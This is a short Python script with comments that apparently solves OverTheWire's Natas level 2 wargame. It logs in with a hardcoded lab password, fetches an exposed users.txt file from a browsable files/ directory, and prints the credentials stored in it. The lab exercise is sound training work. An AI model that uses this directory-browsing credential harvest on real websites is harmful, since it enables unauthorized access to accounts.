import requests


url= "http://natas2.natas.labs.overthewire.org"

s=requests.Session()
s.auth=('natas2','ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi')
s.get(url)
r=s.get(url+"/files/users.txt")
print(r.text)
#View the source, we can see the suspicious tag <img src="files/pixel.png">, check the image which 
#is nothing but something in the parent directory, go and see the file users.txt, check and get 
#the credentials.

